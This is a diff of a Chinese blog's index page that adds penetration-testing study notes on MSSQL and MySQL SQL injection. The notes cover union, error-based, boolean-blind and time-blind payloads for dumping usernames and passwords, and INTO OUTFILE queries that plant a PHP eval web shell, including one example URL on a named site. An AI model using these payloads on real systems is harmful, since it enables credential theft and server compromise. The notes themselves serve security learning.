@@ -152,6 +152,115 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/MSSQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="nannanshen">
+      <meta itemprop="description" content="渗透测试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/15/MSSQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">MSSQL注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-02-15 10:27:54 / 修改时间：11:54:38" itemprop="dateCreated datePublished" datetime="2020-02-15T10:27:54+08:00">2020-02-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><h2 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h2><ol>
+<li>sa权限：数据库操作，⽂件管理，命令执⾏，注册表读取等 system。</li>
+<li>db权限：⽂件管理,数据库操作等 users-adminstrators。</li>
+<li>public权限：数据库操作 guest-users。</li>
+</ol>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断是否为注入点</li>
+<li>判断是否为MSSQL<ul>
+<li><code>and exists(select * from sysobjects) --</code></li>
+</ul>
+</li>
+<li>判断权限<ul>
+<li><code>and 1=(select is_srvrolemember(&#39;sysadmin&#39;)) //判断是否是系统管理员</code></li>
+<li><code>and 1=(select is_srvrolemember(&#39;db_owner&#39;)) //判断是否是库权限</code></li>
+<li><code>and 1=(select is_srvrolemember(&#39;public&#39;)) //判断是否为public权限</code></li>
+</ul>
+</li>
+<li>判断字段长度<ul>
+<li>order by</li>
+</ul>
+</li>
+<li>找显位<ul>
+<li><code>id=-2 union all select 1,2,3,4..</code></li>
+<li>注意：如果不是数字型显位，就把数字改为NULL，然后一位一位改成字符型找显位。id后面加负号是因为有时候不加返回的是正常页面，显位被占用。</li>
+</ul>
+</li>
+<li>查询基本信息<ul>
+<li>@@version- 获取版本信息;</li>
+<li>db_name() -数据库名字</li>
+<li>user,system_user,current_user,user_name – 获取当前⽤户名</li>
+<li>@@SERVERNAME – 获取有关服务器主机的信息。</li>
+</ul>
+</li>
+<li>查询表名<ul>
+<li><code>id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#39;u&#39;),&#39;3&#39;,4</code></li>
+<li><code>id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#39;u&#39; and name not in (&#39;manage&#39;)),&#39;3&#39;,4</code></li>
+<li><code>id=-2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=&#39;u&#39; and name not in (&#39;manage&#39;,&#39;announcement&#39;)),&#39;3&#39;,4</code></li>
+</ul>
+</li>
+<li>查询列名<ul>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),1) from sysobjects),null,null</code></li>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),2) from sysobjects),null,null</code></li>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),3) from sysobjects),null,null</code></li>
+<li><code>id=-2 union all select null,(select top 1 col_name(object_id(&#39;manage&#39;),4) from sysobjects),null,null</code></li>
+</ul>
+</li>
+<li>获取数据<ul>
+<li><code>id=-2 union all select null,username, password ,null from manage</code></li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/14/MYSQL%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -175,10 +284,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-02-14 09:00:45 / 修改时间：17:06:59" itemprop="dateCreated datePublished" datetime="2020-02-14T09:00:45+08:00">2020-02-14</time>
+              <time title="创建时间：2020-02-14 09:00:45" itemprop="dateCreated datePublished" datetime="2020-02-14T09:00:45+08:00">2020-02-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-15 12:37:42" itemprop="dateModified" datetime="2020-02-15T12:37:42+08:00">2020-02-15</time>
+              </span>
 
           
 
@@ -214,25 +329,44 @@
 <ol start="3">
 <li>updatexml()</li>
 </ol>
-<figure class="highlight plain"><figcaption><span>* from test where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. geometrycollection()</span><br></pre></td></tr></table></figure>
-<p>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">5. multipoint()</span><br></pre></td></tr></table></figure>
-<p>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6. polygon()</span><br><span class="line"></span><br><span class="line">select * from test where id&#x3D;1 and polygon((select * from(select * from(select</span><br><span class="line">user())a)b));</span><br><span class="line"></span><br><span class="line">7. multipolygon()</span><br></pre></td></tr></table></figure>
-<p>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​</span><br><span class="line"></span><br><span class="line">8. linestring()</span><br></pre></td></tr></table></figure>
-<p>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​</span><br><span class="line"></span><br><span class="line">9. multilinestring()</span><br></pre></td></tr></table></figure>
-<p>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​</span><br><span class="line"></span><br><span class="line">10. exp()</span><br></pre></td></tr></table></figure>
-<p>select * from test where id=1 and exp(~(select * from(select user())a));</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 以上payload自行找资料理解原理</span><br><span class="line"></span><br><span class="line"># 布尔盲注</span><br><span class="line"></span><br><span class="line">## 原理</span><br><span class="line"></span><br><span class="line">* 页面无显位只能返回正常和错误两种情况。</span><br><span class="line">* 通过不停地测试返回结果判别语句执行结果。</span><br><span class="line">* 常用函数</span><br><span class="line">  1. length()返回长度</span><br><span class="line">  2. substr()截取字符串</span><br><span class="line">  3. ascii()返回字符ASCII码</span><br><span class="line">  4. sleep()将程序挂起一段时间</span><br><span class="line"></span><br><span class="line">## 流程</span><br><span class="line"></span><br><span class="line">1. 判断注入类型，数字or字符</span><br><span class="line">2. 猜数据库名：</span><br><span class="line">   1. 猜长度  &#96;&#96;&#96;1&#39; #</span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li>逐字猜解  <code>1&#39; and ascii(substr(database(),1,1))&gt;97 #</code></li>
+<figure class="highlight plain"><figcaption><span>* from test where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. geometrycollection()</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>multipoint()</li>
+</ol>
+<figure class="highlight plain"><figcaption><span>* from test where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6. polygon()</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li>multipolygon()</li>
+</ol>
+<figure class="highlight plain"><figcaption><span>* from test where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">8. linestring()</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>
+<p>​</p>
+<ol start="9">
+<li>multilinestring()</li>
+</ol>
+<figure class="highlight plain"><figcaption><span>* from test where id</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​10. exp()</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;select * from test where id&#x3D;1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以上payload自行找资料理解原理</p>
+</li>
+</ul>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>页面无显位只能返回正常和错误两种情况。</li>
+<li>通过不停地测试返回结果判别语句执行结果。</li>
+<li>常用函数<ol>
+<li>length()返回长度</li>
+<li>substr()截取字符串</li>
+<li>ascii()返回字符ASCII码</li>
+<li>sleep()将程序挂起一段时间</li>
 </ol>
 </li>
 </ul>
-<ol start="3">
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断注入类型，数字or字符</li>
+<li>猜数据库名：<ol>
+<li>猜长度  <code>1&#39;  and length(database())=1 #</code></li>
+<li>逐字猜解  <code>1&#39; and ascii(substr(database(),1,1))&gt;97 #</code></li>
+</ol>
+</li>
 <li>猜表名：<ol>
 <li>猜表的数量 <code>1&#39; and (select count (table_name) from information_schema.tables where table_schema=database())=1 #</code></li>
 <li>猜第一个表的长度  <code>1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #</code></li>
@@ -251,13 +385,13 @@
 </ol>
 </li>
 </ol>
-<h1 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><ul>
+<h1 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h1><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><ul>
 <li>不管语句执行正确或错误返回结果都一样。只能靠时间盲注。</li>
 <li>if(condition,A,B) condition成立，则A，否则B。</li>
-<li>mysql&gt;=5.0 使⽤sleep()进⾏查询   <code>id=1 and sleep(5)</code>，mysql&lt;5.0使⽤benchmark()进⾏查询  <code>select benchmark(1000,select * from admin);</code> 通过查询次数增多，时间变得缓慢来判断是否存在延迟。</li>
+<li>mysql&gt;=5.0 使⽤sleep()进⾏查询   <code>id=1 and sleep(5)</code>，mysql&lt;5.0使用benchmark()进行查询  <code>select benchmark(1000,select * from admin);</code> 通过查询次数增多，时间变得缓慢来判断是否存在延迟。</li>
 </ul>
-<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol>
-<li>判断是否存在延迟注⼊  <code>id=1 and sleep(5)</code></li>
+<h2 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h2><ol>
+<li>判断是否存在延迟注入  <code>id=1 and sleep(5)</code></li>
 <li>判断当前用户  <code>and if(ascii(substr(user(),1,1))=114,sleep(5),1)</code></li>
 <li>判断数据库名长度 <code>if(length(database())=8,sleep(5),1)</code></li>
 <li>猜解数据库名称  <code>and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)</code></li>
@@ -268,7 +402,7 @@
 <h1 id="root权限处理"><a href="#root权限处理" class="headerlink" title="root权限处理"></a>root权限处理</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul>
 <li>当前连接到的mysql用户具有root权限</li>
 <li>能获取到网站的物理路径（phpinfo、报错、爆破…） </li>
-<li>5.5.53之前的版本是secure_file_priv 变量默认为空，所以默认情况下是可以直接通过SQL语句来导出⽂件的。⾼于5.5时，mysql新出了⼀个secure-file-priv 字段 : secure-file-priv 参数是⽤来限制读写文件。查看secure-file-priv 参数的值:  <code>show global variables like &#39;%secure%&#39;</code></li>
+<li>5.5.53之前的版本是secure_file_priv 变量默认为空，所以默认情况下是可以直接通过SQL语句来导出文件的。高于5.5时，mysql新出了一个secure-file-priv 字段 : secure-file-priv 参数是用来限制读写文件。查看secure-file-priv 参数的值:  <code>show global variables like &#39;%secure%&#39;</code></li>
 </ul>
 <h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol>
 <li><p>读文件</p>
@@ -279,20 +413,24 @@
 </li>
 <li><p>写文件</p>
 <ul>
-<li><p>INTO OUTFILE函数写⽂件时会在每⼀⾏的结束⾃动加上换⾏符</p>
+<li><p>INTO OUTFILE函数写文件时会在每一行的结束自动加上换⾏符</p>
 </li>
-<li><p>INTO DUMPFILE函数在写⽂件会保持⽂件得到原⽣内容，这种⽅式对于⼆进制⽂件是最好的选择</p>
+<li><p>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择</p>
 </li>
 <li><p><code>select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into outfile &#39;/var/www/html/muma.php&#39; ;</code>  注意，有时候斜杠要转义，用双斜杠代替</p>
 </li>
 <li><p><code>select &#39;&lt;?php @eval($_POST[pass])?&gt;&#39; into DUMPFILE &#39;/var/www/html/muma.php&#39; ;</code></p>
 </li>
-<li><pre><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; LINES STARTING BY &apos;&lt;?php @eval($_POST[pass])?&gt;&apos; 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   * LINES STARTING BY &#39;写⼊的内容&#39;：设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</span><br><span class="line"></span><br><span class="line">   * LINES TERMINATED BY &#39;写⼊的内容&#39;：设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是&quot;\n&quot;。</span><br><span class="line"></span><br><span class="line">## 案例</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;http:&#x2F;&#x2F;www.dark5.net&#x2F;index.php?id&#x3D;1 and 1&#x3D;2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39; -- a</span><br></pre></td></tr></table></figure>
-</code></pre></li>
+<li><p><code>select * from tdb_goods where goods_id=1 into outfile &quot;/var/www/html/muma.php&quot; LINES STARTING BY &#39;&lt;?php @eval($_POST[pass])?&gt;&#39;</code></p>
+</li>
+<li><p>LINES STARTING BY ‘写⼊的内容’：设置每⾏数据开头的字符，可以为单个或多个字符。默认情况下不使⽤任何字符。</p>
+</li>
+<li><p>LINES TERMINATED BY ‘写⼊的内容’：设置每⾏数据结尾的字符，可以为单个或多个字符。默认值是”\n”。</p>
+</li>
 </ul>
 </li>
 </ol>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p><code>http://www.dark5.net/index.php?id=1 and 1=2 union select 1,2,3,4,&#39;&lt;?php eval($_POST[1])?&gt;&#39;,5 into outfile &#39;/var/www/html/1.php&#39; -- a</code></p>
 <h2 id="GPC的问题"><a href="#GPC的问题" class="headerlink" title="GPC的问题"></a>GPC的问题</h2><p>PHP开启GPC以后，会把接收的字符加上反斜杠转义。</p>
 
       
@@ -962,7 +1100,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
